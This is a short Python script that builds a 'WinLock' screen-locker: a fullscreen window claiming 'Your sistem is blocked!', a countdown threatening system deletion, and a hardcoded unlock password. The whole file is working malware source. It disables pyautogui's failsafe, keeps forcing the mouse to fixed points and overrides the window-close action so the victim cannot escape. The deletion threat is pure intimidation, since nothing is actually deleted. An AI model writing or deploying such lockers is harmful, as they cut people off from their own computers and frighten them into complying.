from tkinter import * 
import pyautogui  

read1ng=" "
password=("pssword")
t1me=7200
d3l="System deleted..." 

def block(): 
    pyautogui.click(x=675,y=405) 
    pyautogui.moveTo(x=675,y=405) 
    screen.protocol("WM_DELETE_WINDOW",block) 
    screen.update()
    
def password_check(event): 
    global read1ng
    read1ng=field.get() 
    if read1ng==password: 
        screen.destroy() 

screen=Tk() 
screen.title("WinLock vlmi.su") 
screen.attributes("-fullscreen",True) 
screen.configure(background="#1c1c1c")
pyautogui.FAILSAFE=False 
field=Entry(screen,fg="green",justify=CENTER) 
but=Button(screen,text="Unlock") 
text0=Label(screen,text="Your sistem is blocked!",font="TimesNewRoman 30",fg="white",bg="#1c1c1c") 
l=Label(text=t1me,font="Arial 22",fg="red",bg="#1c1c1c")
l1=Label(text="System was deletd:",fg="white",bg="#1c1c1c",font="Arial 15")
but.bind('<Button-1>',password_check)
field.place(width=150,height=50,x=600,y=300)
but.place(width=150,height=50,x=600,y=380) 
l1.place(x=20,y=70) 
l.place(x=20,y=100) 
screen.update()
pyautogui.click(x=675,y=325) 
pyautogui.moveTo(x=660,y=410) 
while read1ng!=password: 
    l.configure(text=t1me) 
    screen.after(300) 
    if t1me==0: 
        t1me=d3l 

    if t1me!=d3l:
        t1me=t1me-1
    block() 
